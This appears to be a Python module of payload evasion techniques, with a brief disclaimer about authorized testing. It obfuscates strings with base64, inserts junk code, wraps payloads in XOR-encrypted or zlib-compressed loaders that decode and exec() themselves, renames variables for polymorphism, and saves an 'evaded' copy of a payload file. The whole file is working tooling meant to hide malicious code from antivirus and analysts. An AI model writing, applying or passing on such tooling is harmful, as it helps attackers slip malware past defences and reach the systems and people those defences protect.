"""
Evasion Techniques for Payloads
WARNING: For authorized testing and educational purposes only.
"""
import os
import random
import string
import base64
import zlib
from typing import Dict, Optional
import tempfile


class EvasionTechniques:
    """Various evasion techniques for payloads"""
    
    def __init__(self):
        pass
    
    def obfuscate_strings(self, code: str) -> str:
        """Obfuscate all strings in code"""
        import re
        
        # Find all strings
        string_pattern = r'["\']([^"\']+)["\']'
        strings = re.findall(string_pattern, code)
        
        obfuscated_code = code
        for s in strings:
            # Encode string
            encoded = base64.b64encode(s.encode()).decode()
            # Replace with obfuscated version
            obfuscated_code = obfuscated_code.replace(
                f'"{s}"',
                f'base64.b64decode("{encoded}").decode()'
            )
            obfuscated_code = obfuscated_code.replace(
                f"'{s}'",
                f'base64.b64decode("{encoded}").decode()'
            )
        
        # Add import if needed
        if "base64.b64decode" in obfuscated_code and "import base64" not in obfuscated_code:
            obfuscated_code = "import base64\n" + obfuscated_code
        
        return obfuscated_code
    
    def add_junk_code(self, code: str, junk_count: int = 5) -> str:
        """Add junk code to confuse analysis"""
        junk_lines = []
        
        for _ in range(junk_count):
            var_name = ''.join(random.choices(string.ascii_lowercase, k=8))
            junk_lines.append(f"{var_name} = {random.randint(0, 1000)}")
            junk_lines.append(f"if {var_name} > 9999: pass")
        
        # Insert junk at random positions
        lines = code.split('\n')
        for junk in junk_lines:
            pos = random.randint(0, len(lines))
            lines.insert(pos, junk)
        
        return '\n'.join(lines)
    
    def encrypt_payload(self, code: str, key: Optional[str] = None) -> str:
        """Encrypt payload code"""
        if key is None:
            key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        
        # Simple XOR encryption
        encrypted_bytes = bytearray()
        for i, byte in enumerate(code.encode()):
            encrypted_bytes.append(byte ^ ord(key[i % len(key)]))
        
        encrypted_b64 = base64.b64encode(encrypted_bytes).decode()
        
        decryption_code = f'''
import base64

encrypted = "{encrypted_b64}"
key = "{key}"

# Decrypt
encrypted_bytes = base64.b64decode(encrypted)
decrypted = bytearray()
for i, byte in enumerate(encrypted_bytes):
    decrypted.append(byte ^ ord(key[i % len(key)]))

exec(decrypted.decode())
'''
        return decryption_code
    
    def compress_payload(self, code: str) -> str:
        """Compress payload"""
        compressed = zlib.compress(code.encode())
        encoded = base64.b64encode(compressed).decode()
        
        decompression_code = f'''
import zlib
import base64

compressed = "{encoded}"
decompressed = zlib.decompress(base64.b64decode(compressed)).decode()
exec(decompressed)
'''
        return decompression_code
    
    def create_polymorphic_variant(self, base_code: str) -> str:
        """Create polymorphic variant of code"""
        # Add random variable names
        var_mapping = {}
        for word in ['key', 'data', 'file', 'path', 'result']:
            new_name = ''.join(random.choices(string.ascii_lowercase, k=8))
            var_mapping[word] = new_name
        
        # Replace variables
        polymorphic = base_code
        for old, new in var_mapping.items():
            polymorphic = polymorphic.replace(old, new)
        
        # Add junk code
        polymorphic = self.add_junk_code(polymorphic, 3)
        
        return polymorphic
    
    def create_stealth_payload(self, payload_path: str, 
                              evasion_methods: list = None) -> Dict:
        """Create payload with multiple evasion techniques"""
        evasion_methods = evasion_methods or ["obfuscate", "compress", "junk"]
        
        with open(payload_path, 'r') as f:
            code = f.read()
        
        # Apply evasion techniques
        if "obfuscate" in evasion_methods:
            code = self.obfuscate_strings(code)
        
        if "compress" in evasion_methods:
            code = self.compress_payload(code)
        elif "encrypt" in evasion_methods:
            code = self.encrypt_payload(code)
        
        if "junk" in evasion_methods:
            code = self.add_junk_code(code)
        
        if "polymorphic" in evasion_methods:
            code = self.create_polymorphic_variant(code)
        
        # Save evaded payload
        evaded_path = os.path.join(
            os.path.dirname(payload_path),
            f"evaded_{os.path.basename(payload_path)}"
        )
        
        with open(evaded_path, 'w') as f:
            f.write(code)
        
        return {
            "type": "stealth_payload",
            "original": payload_path,
            "evaded": evaded_path,
            "methods": evasion_methods,
            "warning": "Educational only. Use in isolated VM. Illegal without authorization."
        }
